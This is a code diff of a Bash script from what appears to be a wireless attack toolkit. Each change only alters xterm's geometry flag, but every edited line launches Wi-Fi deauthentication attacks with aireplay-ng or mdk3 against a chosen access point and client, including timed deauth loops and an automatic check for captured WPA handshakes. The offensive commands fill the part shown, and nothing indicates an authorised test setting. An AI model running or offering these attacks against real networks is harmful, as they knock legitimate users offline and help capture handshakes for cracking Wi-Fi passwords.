@@ -219,7 +219,7 @@ do
 		export DEAUTHS
 		export TARGB
 		export MACTD
-		xterm --geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MACTD $IGNN $WLANNM && exit; exec bash' & disown
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $MACTD $IGNN $WLANNM && exit; exec bash' & disown
 	fi
 	if [[ "$STATION" = "r" ]]
 	then
@@ -241,7 +241,7 @@ do
 			export DEAUTHS
 			export TARGB
 			export DSTATION
-			xterm --geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
+			xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
 			n=$((n+1))
 		done
 	fi
@@ -261,7 +261,7 @@ do
 		export DEAUTHS
 		export TARGB
 		export DSTATION
-		xterm --geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
+		xterm -geometry 90x15+9999+999999 -e bash -c 'printf "\033]2;DEAUTHING\a" && aireplay-ng -0 $DEAUTHS -a $TARGB -c $DSTATION $IGNN $WLANNM && exit; exec bash' & disown
 	fi
 done
 }
@@ -381,7 +381,7 @@ do
 		export TARGB
 		find_pid
 		export AVPID
-		xterm --geometry 90x15+9999+999999 -T "DEAUTHING" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $EPATH/$AVPID && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $EPATH/$AVPID && aireplay-ng -0 $DEAUTHS -a $TARGB $IGNN $WLANNM && exit; exec bash' & disown
 	elif [[ "$DT" == 4 ]]
 	then
 		echo -e "Number of deauths per time: "
@@ -409,7 +409,7 @@ do
 		LASTOPTIONS="4"
 		find_pid
 		export AVPID
-		xterm --geometry 90x15+9999+999999 -T "DEAUTHING" -e 'DPID1=$$ && export DPID1 && echo "$DPID1" > $EPATH/$AVPID && while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit' & disown
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e 'DPID1=$$ && export DPID1 && echo "$DPID1" > $EPATH/$AVPID && while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit' & disown
 	elif [[ "$DT" == 5 ]]
 	then
 		if [[ "$HANDF" != "deauth" ]]
@@ -454,7 +454,7 @@ do
 			then
 				export Del
 				export HANDCAP
-				xterm --geometry 50x20+0+999999 -T "AUTOCHECK FOR HANDSHAKE" -e "/etc/ehtools/modules/eht/eht21" & disown
+				xterm -geometry 50x20+0+999999 -T "AUTOCHECK FOR HANDSHAKE" -e "/etc/ehtools/modules/eht/eht21" & disown
 			else
 				echo -e ""$RS"eht2 returned a fatal error (Invalid interval)"$CE""
 				sleep 2
@@ -471,9 +471,9 @@ do
 					#~ option3
 				#~ elif [[ "$LASTOPTIONS" = 4 ]]
 				#~ then
-					#~ xterm --geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
+					#~ xterm -geometry 90x15+9999+999999 -T "DEAUTHING" -e "while true; do aireplay-ng -0 $DPT -a $TARGB $IGNN $WLANNM; sleep $DIS; done && exit" & disown
 				#~ else
-					#~ xterm --geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
+					#~ xterm -geometry 90x15+9999+999999 -e bash -c "$LASTOPTIONS; exec bash" & disown
 				#~ fi
 			#~ fi
 		#~ fi
@@ -486,7 +486,7 @@ do
 		export TARGB
 		find_pid
 		export AVPID
-		xterm --geometry 90x15+9999+999999 -T "DEAUTHING WITH MDK3" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $EPATH/$AVPID && mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
+		xterm -geometry 90x15+9999+999999 -T "DEAUTHING WITH MDK3" -e bash -c 'DPID1=$$ && export DPID1 && echo "$DPID1" > $EPATH/$AVPID && mdk3 $WLANNM d -b /root/mdk3bssid.txt -c $TARGC; exec bash' & disown
 	elif [[ "$DT" = 3 ]]
 	then
 		LASTOPTIONS=1
